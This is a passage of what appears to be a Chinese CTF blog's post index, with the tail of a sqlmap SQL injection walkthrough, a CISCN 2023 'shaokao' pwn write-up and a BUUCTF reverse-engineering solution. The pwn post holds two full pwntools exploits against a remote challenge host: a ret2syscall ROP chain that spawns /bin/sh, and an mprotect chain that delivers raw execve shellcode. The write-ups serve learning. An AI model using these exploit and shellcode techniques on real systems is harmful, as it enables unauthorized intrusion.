src="https://pic.imgdb.cn/item/66b6d76ed9c307b7e9578fb2.png"></p><p>–batch 自动回答问题</p><p>GET类型，可能是盲注或报错注入</p><h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><p><img src="https://pic.imgdb.cn/item/66b6d781d9c307b7e9579d4e.png"></p><p>结果：</p><p><img src="https://pic.imgdb.cn/item/66b6d795d9c307b7e957ab73.png"></p><p>–dbs列出库名</p><p>做题过程中一般只用到当前数据库</p><p><img src="https://pic.imgdb.cn/item/66b6d7add9c307b7e957d495.png"></p><p><img src="https://pic.imgdb.cn/item/66b6d7c5d9c307b7e957e794.png"></p><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p><img src="https://pic.imgdb.cn/item/66b6d7d7d9c307b7e957f643.png"></p><p>结果</p><p><img src="https://pic.imgdb.cn/item/66b6d7ead9c307b7e95804b5.png"></p><h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p><img src="https://pic.imgdb.cn/item/66b6d7ffd9c307b7e958130c.png"></p><p>结果</p><p><img src="https://pic.imgdb.cn/item/66b6d820d9c307b7e958292f.png"></p><h4 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h4><p><img src="https://pic.imgdb.cn/item/66b6d831d9c307b7e95833ad.png"></p><p>结果</p><p><img src="https://pic.imgdb.cn/item/66b6d846d9c307b7e958429b.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WEB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023烧烤摊儿</title>
      <link href="/posts/54d49677/"/>
      <url>/posts/54d49677/</url>
      
        <content type="html"><![CDATA[<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><h3 id="首先拿到文件后checksec"><a href="#首先拿到文件后checksec" class="headerlink" title="首先拿到文件后checksec"></a>首先拿到文件后checksec</h3><p><img src="https://pic.imgdb.cn/item/66b5cf82d9c307b7e9703cce.png"></p><p>开了NX和栈保护</p><h3 id="进入64位ida分析程序"><a href="#进入64位ida分析程序" class="headerlink" title="进入64位ida分析程序"></a>进入64位ida分析程序</h3><h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><p><img src="https://pic.imgdb.cn/item/66b5cfdfd9c307b7e9708b3a.png"></p><p>依次查看出现的函数</p><h4 id="menu-函数"><a href="#menu-函数" class="headerlink" title="menu()函数"></a>menu()函数</h4><p><img src="https://pic.imgdb.cn/item/66b5d0bcd9c307b7e971580d.png"></p><p>发现当own为1时会触发下面的4，5，0选择</p><h4 id="pijiu-函数"><a href="#pijiu-函数" class="headerlink" title="pijiu()函数"></a>pijiu()函数</h4><p><img src="https://pic.imgdb.cn/item/66b5d136d9c307b7e971c677.png"></p><p>乱码的字在程序运行时会正常显示（这里我也不知道为啥ida不会，尝试了几种修改方案，还是不行……）</p><p>这里我们看红框框住的两个位置，v0-v10的类型均为int，而我们的money在变化时也是直接加了v9 * -10这也就意味这我们的钱可以无限制增加</p><h4 id="chuan（）函数与pijiu（）类似"><a href="#chuan（）函数与pijiu（）类似" class="headerlink" title="chuan（）函数与pijiu（）类似"></a>chuan（）函数与pijiu（）类似</h4><h4 id="yue（）函数"><a href="#yue（）函数" class="headerlink" title="yue（）函数"></a>yue（）函数</h4><p>查看我们的钱包余额</p><h4 id="vip（）函数"><a href="#vip（）函数" class="headerlink" title="vip（）函数"></a>vip（）函数</h4><p>运行对应的位置发现是承包摊位</p><p><img src="https://pic.imgdb.cn/item/66b5d251d9c307b7e972d2b7.png"></p><p>分析函数发现承包摊位会使上文我们提到的own值变为1，触发隐藏选择5，而承包摊位所需要的钱我们则可以利用pijiu（）&#x2F;chuan（）中的漏洞来使我们的余额达到承包摊位所需的数量</p><h4 id="gaming-函数"><a href="#gaming-函数" class="headerlink" title="gaming()函数"></a>gaming()函数</h4><p>来分析选择5对应的函数</p><p><img src="https://pic.imgdb.cn/item/66b5d373d9c307b7e973e3ce.png"></p><p>有scanf函数，存在溢出点</p><p>输入后将v5复制到name</p><p><img src="https://pic.imgdb.cn/item/66b5d3e4d9c307b7e9746ab0.png"></p><p>发现name位于data端</p><p>gdb调试，vmmap查看data段权限</p><p><img src="https://pic.imgdb.cn/item/66b5d490d9c307b7e974fcf6.png"></p><p>所在位置具有读写权限</p><p>可以使用ret2syscall的思路</p><h2 id="ret2syscall方法"><a href="#ret2syscall方法" class="headerlink" title="ret2syscall方法"></a>ret2syscall方法</h2><p>使用execve(‘&#x2F;bin&#x2F;sh\x00’)的方式，将’&#x2F;bin&#x2F;sh\x00’放入name的位置，将name的地址作为rdi的参数</p><p>ROPgadget查看ret，pop rdi等的位置</p><p><code>exp如下：</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#[CISCN 2023 初赛]烧烤摊儿</span></span><br><span class="line"><span class="comment">#方法一 syscall</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;./shaokao&#x27;</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line"></span><br><span class="line">content = <span class="number">1</span>  <span class="comment">#先打本地 本地打通后连接远程</span></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">    p = process(file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28811</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. 勇闯天涯\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;来几瓶？&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-100000&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040264f : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x000000000040a67e : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000402aae : pop rsp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401b01 : pop rbp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000458827 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004a404b : pop rdx ; pop rbx ; ret</span></span><br><span class="line">rdi_addr = <span class="number">0x40264f</span></span><br><span class="line">rsi_addr = <span class="number">0x40a67e</span></span><br><span class="line">rdx_rbx = <span class="number">0x4a404b</span></span><br><span class="line">rax_addr = <span class="number">0x458827</span></span><br><span class="line">syscall = <span class="number">0x402404</span></span><br><span class="line">name_addr = <span class="number">0x4e60f0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p64(rax_addr) + p64(<span class="number">59</span>) <span class="comment">#将execve的系统调用号59放入rax</span></span><br><span class="line">payload += p64(rdi_addr) + p64(name_addr) <span class="comment">#将/bin/sh的地址放入rdi</span></span><br><span class="line">payload += p64(rsi_addr) + p64(<span class="number">0</span>) <span class="comment">#设置execve函数的第二个参数NULL</span></span><br><span class="line">payload += p64(rdx_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)<span class="comment">#设置execve的第三个参数NULL，rbx赋值0</span></span><br><span class="line">payload += p64(syscall) <span class="comment">#触发系统调用</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="mprotect-函数方法"><a href="#mprotect-函数方法" class="headerlink" title="mprotect()函数方法"></a>mprotect()函数方法</h2><p>拖进ida分析时，我们发现有mprotect()函数</p><p><code>mprotect()</code> 函数是用于改变内存区域保护属性的一个系统调用。它允许程序动态地更改已经映射到进程地址空间的内存页的访问权限。这对于实现内存的安全性和灵活性是非常有用的。</p><p><code>mprotect()</code> 的定义通常如下所示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1#include &lt;sys/mman.h&gt;</span><br><span class="line">2</span><br><span class="line">3int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure><h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><ul><li><strong>addr</strong> (void *)：指针指向要修改保护属性的内存区域的起始地址。</li><li><strong>len</strong> (size_t)：要修改保护属性的内存区域的大小（以字节为单位）。</li><li>prot(int)：新的保护标志，可以是由以下标志组合而成的掩码：<ul><li><code>PROT_NONE</code>：不允许任何访问。</li><li><code>PROT_READ</code>：页面可读。</li><li><code>PROT_WRITE</code>：页面可写。</li><li><code>PROT_EXEC</code>：页面可执行。</li></ul></li></ul><p>其中prot的值由上方四个规定来决定</p><p>例如：port&#x3D;7 7的二进制表示为0111，分别对应上方四个规定，则port&#x3D;7表示有读写执行权限</p><p>而我们已知name所在的data段只有读写权限，且vmmap我们也找到了所在数据段的范围，那么mprotect的三个参数我们都可以 确定了</p><p>就可以通过mprotect()函数修改name所在段的权限，添加执行权限，直接向name所在段传入shellcode</p><p><code>exp如下：</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#mprotect()函数为name所在data段增加执行权限</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;./shaokao&#x27;</span></span><br><span class="line">elf = ELF(file)</span><br><span class="line"></span><br><span class="line">content = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">    p = process(file)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28762</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. 勇闯天涯\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;来几瓶？&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-100000&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000040264f : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x000000000040a67e : pop rsi ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000402aae : pop rsp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000401b01 : pop rbp ; ret</span></span><br><span class="line"><span class="comment"># 0x0000000000458827 : pop rax ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004a404b : pop rdx ; pop rbx ; ret</span></span><br><span class="line">rdi_addr = <span class="number">0x40264f</span></span><br><span class="line">rsi_addr = <span class="number">0x40a67e</span></span><br><span class="line">rdx_rbx = <span class="number">0x4a404b</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">name_addr = <span class="number">0x4e60f0</span></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">payload += p64(rdi_addr) + p64(<span class="number">0x4e6000</span>) </span><br><span class="line">payload += p64(rsi_addr) + p64(<span class="number">0x3000</span>)</span><br><span class="line">payload += p64(rdx_rbx) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload +=p64(mprotect_addr) + p64(ret_addr) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3. 勇闯天涯\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;来几瓶？&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-100000&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x28</span> , <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(name_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 刮开有奖</title>
      <link href="/posts/d66b9a90/"/>
      <url>/posts/d66b9a90/</url>
      
        <content type="html"><![CDATA[<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>下载附件后，拖进die分析</p><p><img src="https://pic.imgdb.cn/item/66b472e4d9c307b7e9d02e3f.png"></p><p>32位无壳，直接拖进ida分析</p><p>shift+f12查看字符串</p><p><img src="https://pic.imgdb.cn/item/66b47308d9c307b7e9d04c75.png"></p><p>发现可疑字符串，双击进去发现包含它的函数</p><p><img src="https://pic.imgdb.cn/item/66b4731ed9c307b7e9d05c42.png"></p><p>双击函数名后按Tab&#x2F;F5反编译查看函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">INT_PTR __stdcall <span class="title">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7[<span class="number">2</span>]; <span class="comment">// [esp+8h] [ebp-20030h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+10h] [ebp-20028h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+14h] [ebp-20024h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+18h] [ebp-20020h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+1Ch] [ebp-2001Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+20h] [ebp-20018h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+24h] [ebp-20014h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+28h] [ebp-20010h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+2Ch] [ebp-2000Ch]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+30h] [ebp-20008h]</span></span><br><span class="line">  CHAR String[<span class="number">65536</span>]; <span class="comment">// [esp+34h] [ebp-20004h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">65536</span>]; <span class="comment">// [esp+10034h] [ebp-10004h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 == <span class="number">1001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(String, <span class="number">0</span>, <span class="number">0xFFFFu</span>);</span><br><span class="line">    <span class="built_in">GetDlgItemTextA</span>(hDlg, <span class="number">1000</span>, String, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(String) == <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7[<span class="number">0</span>] = <span class="number">90</span>;</span><br><span class="line">      v7[<span class="number">1</span>] = <span class="number">74</span>;</span><br><span class="line">      v8 = <span class="number">83</span>;</span><br><span class="line">      v9 = <span class="number">69</span>;</span><br><span class="line">      v10 = <span class="number">67</span>;</span><br><span class="line">      v11 = <span class="number">97</span>;</span><br><span class="line">      v12 = <span class="number">78</span>;</span><br><span class="line">      v13 = <span class="number">72</span>;</span><br><span class="line">      v14 = <span class="number">51</span>;</span><br><span class="line">      v15 = <span class="number">110</span>;</span><br><span class="line">      v16 = <span class="number">103</span>;</span><br><span class="line">      <span class="built_in">sub_4010F0</span>(v7, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFFu</span>);</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">5</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">7</span>];</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">6</span>];</span><br><span class="line">      v4 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_401000</span>(v18, <span class="built_in">strlen</span>(v18));</span><br><span class="line">      <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0xFFFFu</span>);</span><br><span class="line">      v18[<span class="number">1</span>] = String[<span class="number">3</span>];</span><br><span class="line">      v18[<span class="number">0</span>] = String[<span class="number">2</span>];</span><br><span class="line">      v18[<span class="number">2</span>] = String[<span class="number">4</span>];</span><br><span class="line">      v5 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_401000</span>(v18, <span class="built_in">strlen</span>(v18));</span><br><span class="line">      <span class="keyword">if</span> ( String[<span class="number">0</span>] == v7[<span class="number">0</span>] + <span class="number">34</span></span><br><span class="line">        &amp;&amp; String[<span class="number">1</span>] == v10</span><br><span class="line">        &amp;&amp; <span class="number">4</span> * String[<span class="number">2</span>] - <span class="number">141</span> == <span class="number">3</span> * v8</span><br><span class="line">        &amp;&amp; String[<span class="number">3</span>] / <span class="number">4</span> == <span class="number">2</span> * (v13 / <span class="number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;ak1w&quot;</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">&quot;V1Ax&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(hDlg, <span class="string">&quot;U g3t 1T!&quot;</span>, <span class="string">&quot;@_@&quot;</span>, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">EndDialog</span>(hDlg, (<span class="type">unsigned</span> __int16)a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><h4 id="DialogFunc-函数"><a href="#DialogFunc-函数" class="headerlink" title="DialogFunc()函数"></a>DialogFunc()函数</h4><p><code>DialogFunc()</code>函数的作用通常是处理对话框的创建和消息传递。这个函数通常与图形用户界面（GUI）编程有关，特别是在使用 Windows API 或类似库时。它处理由对话框窗口接收的所有消息，例如按钮点击、文本输入等。</p><h4 id="memset函数"><a href="#memset函数" class="headerlink" title="memset函数"></a>memset函数</h4><p><code>memset()</code> 函数是 C 标准库中的一个函数，用于将一块内存区域的内容设置为指定的值。它通常用于初始化或重置内存中的数据。</p><h4 id="GetDlgItemTextA-函数"><a href="#GetDlgItemTextA-函数" class="headerlink" title="GetDlgItemTextA()函数"></a>GetDlgItemTextA()函数</h4><p><code>GetDlgItemTextA()</code> 函数是 Windows API 中的一个函数，用于从指定的对话框控件（例如编辑框、静态文本控件等）中检索文本。这个函数是 <code>GetDlgItemText()</code> 函数的 ANSI 版本（带有 <code>A</code> 后缀），用于处理 ANSI 字符集。</p><h3 id="加密逻辑分析"><a href="#加密逻辑分析" class="headerlink" title="加密逻辑分析"></a>加密逻辑分析</h3><p>首先看这一部分</p><p><img src="https://pic.imgdb.cn/item/66b4733bd9c307b7e9d07290.png"></p><p>10h-08h&#x3D;08h，一个int四个字节，正好对应v7两个值的内存</p><p>14h-10h&#x3D;04h，也是一个int类型的4个字节</p><p>即v7-v16为一个数组的值</p><p>继续往下看，发现加密函数sub_4010F0()</p><p>继续往下看</p><p><img src="https://pic.imgdb.cn/item/66b4734ed9c307b7e9d08148.png"></p><p>发现v4,v5是分别在string对v18赋值后再经过sub_401000()函数</p><p>并将最后的结果v4与ak1w比较，v5与V1Ax比较</p><p>所以加密的逻辑为，v7数组先经过sub_4010F0()函数得到新的数组值，再将新的数组值赋值给v4，v5。v4，v5经过函数sub_401000()再与给出的两个字符串做比较。所以我们的重心便是分析两个加密函数</p><h3 id="sub-401000-函数"><a href="#sub-401000-函数" class="headerlink" title="sub_401000()函数"></a>sub_401000()函数</h3><p>首先看sub_401000()</p><p><img src="https://pic.imgdb.cn/item/66b47368d9c307b7e9d0959d.png"></p><p>观察函数发现是典型的base64加密，再看byte_407830发现是基础的base表</p><p><img src="https://pic.imgdb.cn/item/66b47385d9c307b7e9d0b388.png"></p><p>那么将已得到的字符串进行base64解密</p><p>分别得到string的第2，3，4个字符（v5比较的字符串base64解密）为：WP1</p><p><img src="https://pic.imgdb.cn/item/66b47396d9c307b7e9d0c482.png"></p><p>string的第5，6，7个字符（v4比较的字符串base64解密）为：jMp</p><p><img src="https://pic.imgdb.cn/item/66b473a7d9c307b7e9d0d2ce.png"></p><h3 id="sub-4010F0-函数"><a href="#sub-4010F0-函数" class="headerlink" title="sub_4010F0()函数"></a>sub_4010F0()函数</h3><p>进入分析，就是一个加密的算法，直接将函数整个复制下来</p><p>其中的 _DWORD 对应的就是无符号字符类型</p><p><img src="https://pic.imgdb.cn/item/66b473c0d9c307b7e9d0e94d.png"></p><p>再根据这四个判断还原出string的前四个字符</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span>  <span class="comment">//竞赛编程中常用头文件，包含所有c++标准库头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD unsigned char</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> v7[<span class="number">15</span>] = &#123;<span class="number">90</span>, <span class="number">74</span>, <span class="number">83</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">97</span>, <span class="number">78</span>, <span class="number">72</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">103</span>&#125;;</span><br><span class="line"><span class="type">char</span> string[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4010F0</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> i;      <span class="comment">// esi</span></span><br><span class="line">    <span class="type">int</span> v5;     <span class="comment">// ecx</span></span><br><span class="line">    <span class="type">int</span> v6;     <span class="comment">// edx</span></span><br><span class="line">    result = a3;</span><br><span class="line">    <span class="keyword">for</span> (i = a2; i &lt;= a3; a2 = i)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = i;</span><br><span class="line">        v6 = *(_DWORD *)(i + a1);</span><br><span class="line">        <span class="keyword">if</span> (a2 &lt; result &amp;&amp; i &lt; result)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (v6 &gt; *(_DWORD *)(a1 + result))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    ++i;</span><br><span class="line">                    *(_DWORD *)(v5 + a1) = *(_DWORD *)(a1 + result);</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">while</span> (*(_DWORD *)(a1 + i) &lt;= v6)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span> (++i &gt;= result)</span><br><span class="line">                            <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    v5 = i;</span><br><span class="line">                    *(_DWORD *)(a1 + result) = *(_DWORD *)(i + a1);</span><br><span class="line">                &#125;</span><br><span class="line">                --result;</span><br><span class="line">            &#125; <span class="keyword">while</span> (i &lt; result);</span><br><span class="line">        &#125;</span><br><span class="line">    LABEL_13:</span><br><span class="line">        *(_DWORD *)(a1 + result) = v6;</span><br><span class="line">        <span class="built_in">sub</span>(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">        result = a3;</span><br><span class="line">        ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">sub_4010F0</span>(v7, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">    cout &lt;&lt; v7 &lt;&lt; endl;</span><br><span class="line">    string[<span class="number">0</span>] = v7[<span class="number">0</span>] + <span class="number">34</span>;</span><br><span class="line">    string[<span class="number">1</span>] = v7[<span class="number">4</span>];</span><br><span class="line">    string[<span class="number">2</span>] = (<span class="number">3</span> * v7[<span class="number">2</span>] + <span class="number">141</span>) / <span class="number">4</span>;</span><br><span class="line">    string[<span class="number">3</span>] = <span class="number">8</span> * (v7[<span class="number">7</span>] / <span class="number">9</span>);</span><br><span class="line">    cout &lt;&lt; string &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行代码得到</p><p><img src="https://pic.imgdb.cn/item/66b473e1d9c307b7e9d10431.png"></p><p>再去前文得到的string2，3，4，5，6，7组合得到flag</p><p>flag{UJWp1jMp}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Syetem()与Execve()的区别</title>
      <link href="/posts/fd137f81/"/>
      <url>/posts/fd137f81/</url>
      
